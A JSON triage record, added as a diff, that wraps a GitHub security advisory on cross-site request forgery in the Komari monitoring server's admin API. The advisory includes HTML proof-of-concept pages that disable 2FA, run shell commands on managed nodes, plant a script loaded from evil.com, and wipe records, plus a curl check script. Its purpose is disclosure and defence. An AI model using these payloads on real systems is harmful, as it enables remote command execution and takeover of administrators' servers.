@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/75193557?v=4\", \"events_url\": \"https://api.github.com/users/GuangChen2333/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/GuangChen2333/followers\", \"following_url\": \"https://api.github.com/users/GuangChen2333/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/GuangChen2333/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/GuangChen2333\", \"id\": 75193557, \"login\": \"GuangChen2333\", \"node_id\": \"MDQ6VXNlcjc1MTkzNTU3\", \"organizations_url\": \"https://api.github.com/users/GuangChen2333/orgs\", \"received_events_url\": \"https://api.github.com/users/GuangChen2333/received_events\", \"repos_url\": \"https://api.github.com/users/GuangChen2333/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/GuangChen2333/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/GuangChen2333/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/GuangChen2333\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-918\", \"name\": \"Server-Side Request Forgery (SSRF)\"}], \"description\": \"# Vulnerability Overview\\n\\nThe `session_token` cookie is set **without** the `SameSite` or `Secure` attributes (`login.go:68`).\\n\\nAll `/api/admin/` management endpoints rely solely on this cookie for authentication, with **no CSRF token or Origin validation**.\\n\\n**The server-side vulnerability is confirmed to exist; however, exploitation via cross-site requests is mitigated in modern browsers by the default `SameSite=Lax` behavior.**\\n\\n## Root Cause\\n\\n```go\\n// komari-main/api/public/login.go:68\\nc.SetCookie(\\\"session_token\\\", session, 2592000, \\\"/\\\", \\\"\\\", false, true)\\n//   Secure=false, SameSite not explicitly set\\n//   Admin route group (server.go:213-343) has no CSRF middleware\\n```\\n\\nGin's `ShouldBindJSON` does not strictly validate the `Content-Type` header, allowing `text/plain` requests to bypass CORS preflight.\\n\\n## Browser Limitations\\n\\n- Chrome 80+ (Feb 2020), Firefox 103+ (Jul 2022), and Safari all default unspecified cookies to `SameSite=Lax`.\\n- Cookies without an explicit `SameSite` attribute **are not included in cross-site POST requests**.\\n- As a result, the server receives requests without the session cookie and returns **HTTP 401 Unauthorized**.\\n\\n| Scenario | Exploitable |\\n|----------|-------------|\\n| Cross-site HTML (modern browsers) | ✗ Blocked by `SameSite=Lax` |\\n| Cross-site HTML (Chrome <80 / legacy browsers) | ✓ |\\n| Same-origin context (Browser Console / existing XSS) | ✓ |\\n| Man-in-the-middle over HTTP (`Secure=false`) | ✓ |\\n\\n## High-Impact Operations Reachable via CSRF\\n\\n| Endpoint | Method | Impact |\\n|----------|--------|--------|\\n| `/api/admin/task/exec` | POST | Execute arbitrary shell commands on managed nodes |\\n| `/api/admin/2fa/disable` | POST | Disable administrator two-factor authentication |\\n| `/api/admin/settings/` | POST | Modify system configuration |\\n| `/api/admin/upload/backup` | POST | Upload a malicious backup |\\n| `/api/admin/record/clear/all` | POST | Delete all monitoring records |\\n| `/api/admin/client/:uuid/edit` | POST | Modify client configuration |\\n| `/api/admin/client/:uuid/remove` | POST | Remove managed clients |\\n| `/api/admin/session/remove/all` | POST | Invalidate all active sessions |\\n| `/api/admin/settings/cloudflared/start` | POST | Start a Cloudflared tunnel |\\n\\n## PoC 1 — Disable 2FA\\n\\n```html\\n<!DOCTYPE html>\\n<html>\\n<head><title>Loading...</title></head>\\n<body>\\n<iframe name=\\\"sink\\\" style=\\\"display:none\\\"></iframe>\\n<form id=\\\"f\\\" method=\\\"POST\\\"\\n      action=\\\"https://komari.example.com/api/admin/2fa/disable\\\"\\n      target=\\\"sink\\\"></form>\\n<script>\\n  document.getElementById('f').submit();\\n</script>\\n</body>\\n</html>\\n```\\n\\n## PoC 2 — Remote Command Execution\\n\\n```html\\n<!DOCTYPE html>\\n<html>\\n<head><title>Loading...</title></head>\\n<body>\\n<script>\\nvar KOMARI = \\\"https://komari.example.com\\\";\\nvar CMD    = \\\"id && hostname && whoami\\\";\\n\\nfetch(KOMARI + \\\"/api/admin/client/list\\\", { credentials: \\\"include\\\" })\\n  .then(function(r){ return r.json(); })\\n  .then(function(data){\\n    var nodes = data.data || [];\\n    var uuids = [];\\n    for (var i = 0; i < nodes.length; i++) {\\n      if (nodes[i].uuid) uuids.push(nodes[i].uuid);\\n    }\\n    if (uuids.length === 0) return;\\n    return fetch(KOMARI + \\\"/api/admin/task/exec\\\", {\\n      method: \\\"POST\\\",\\n      credentials: \\\"include\\\",\\n      headers: { \\\"Content-Type\\\": \\\"application/json\\\" },\\n      body: JSON.stringify({ command: CMD, clients: uuids })\\n    });\\n  });\\n</script>\\n</body>\\n</html>\\n```\\n\\n## PoC 3 — Modify System Configuration\\n\\n```html\\n<!DOCTYPE html>\\n<html>\\n<head><title>Loading...</title></head>\\n<body>\\n<script>\\nvar KOMARI = \\\"https://komari.example.com\\\";\\nfetch(KOMARI + \\\"/api/admin/settings/\\\", {\\n  method: \\\"POST\\\",\\n  credentials: \\\"include\\\",\\n  headers: { \\\"Content-Type\\\": \\\"application/json\\\" },\\n  body: JSON.stringify({\\n    \\\"site_name\\\": \\\"Pwned\\\",\\n    \\\"custom_head\\\": \\\"<script src='https://evil.com/hook.js'><\\\\/script>\\\"\\n  })\\n});\\n</script>\\n</body>\\n</html>\\n```\\n\\n## PoC 4 — Clear All Monitoring Records\\n\\n```html\\n<!DOCTYPE html>\\n<html>\\n<head><title>Loading...</title></head>\\n<body>\\n<iframe name=\\\"sink\\\" style=\\\"display:none\\\"></iframe>\\n<form id=\\\"f\\\" method=\\\"POST\\\"\\n      action=\\\"https://komari.example.com/api/admin/record/clear/all\\\"\\n      target=\\\"sink\\\"></form>\\n<script>\\ndocument.getElementById('f').submit();\\n</script>\\n</body>\\n</html>\\n```\\n\\n## Verification Script\\n\\n```bash\\n#!/bin/bash\\nKOMARI=\\\"${1:-https://komari.example.com}\\\"\\n\\necho \\\"=== CSRF Verification ===\\\"\\n\\necho \\\"[1] Cookie Attributes...\\\"\\ncurl -s -D - -o /dev/null \\\\\\n  -X POST \\\"$KOMARI/api/public/login\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"username\\\":\\\"test\\\",\\\"password\\\":\\\"test\\\"}' | grep -i 'set-cookie'\\n\\necho \\\"\\\"\\necho \\\"[2] CORS Headers...\\\"\\ncurl -s -D - -o /dev/null \\\\\\n  -H \\\"Origin: https://evil.com\\\" \\\\\\n  \\\"$KOMARI/api/public/config\\\" | grep -i 'access-control'\\n\\necho \\\"\\\"\\necho \\\"[3] CSRF Protection on Admin Endpoint...\\\"\\nCODE=$(curl -s -o /dev/null -w \\\"%{http_code}\\\" \\\\\\n  -X POST \\\"$KOMARI/api/admin/settings/\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -H \\\"Origin: https://evil.com\\\" \\\\\\n  -d '{}')\\n\\necho \\\"    HTTP ${CODE} — A 401 response indicates that only session authentication is enforced and no CSRF protection is present.\\\"\\n```\", \"ghsa_id\": \"GHSA-hxjg-93wc-h8p8\", \"github_reviewed_at\": \"2026-09-09T23:48:31Z\", \"html_url\": \"https://github.com/advisories/GHSA-hxjg-93wc-h8p8\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-hxjg-93wc-h8p8\"}], \"nvd_published_at\": null, \"published_at\": \"2026-09-09T23:48:31Z\", \"references\": [\"https://github.com/komari-monitor/komari/security/advisories/GHSA-hxjg-93wc-h8p8\", \"https://github.com/komari-monitor/komari/releases/tag/1.2.2\", \"https://github.com/advisories/GHSA-hxjg-93wc-h8p8\"], \"repository_advisory_url\": \"https://api.github.com/repos/komari-monitor/komari/security-advisories/GHSA-hxjg-93wc-h8p8\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/komari-monitor/komari\", \"summary\": \"Komari: Management Interface CSRF\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-09T23:48:32Z\", \"url\": \"https://api.github.com/advisories/GHSA-hxjg-93wc-h8p8\", \"vulnerabilities\": [{\"first_patched_version\": \"0.0.0-20260609084633-98122fa4d110\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/komari-monitor/komari\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 0.0.0-20260609084633-98122fa4d110\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-hxjg-93wc-h8p8",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/komari-monitor/komari: < 0.0.0-20260609084633-98122fa4d110"
+    ],
+    "authentication_required": false,
+    "cves": [],
+    "cvss_score": 8.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/komari-monitor/komari"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-09-10T19:13:40.956009Z",
+  "provenance": {
+    "content_sha256": "0698e61a9554804faaf9fe4b572a84cf4423a1b2318d9abd70505ddb03a18211",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-09T23:48:31Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-hxjg-93wc-h8p8",
+  "status": "active",
+  "title": "Komari: Management Interface CSRF",
+  "updated_at": "2026-09-09T23:48:32Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-hxjg-93wc-h8p8"
+}
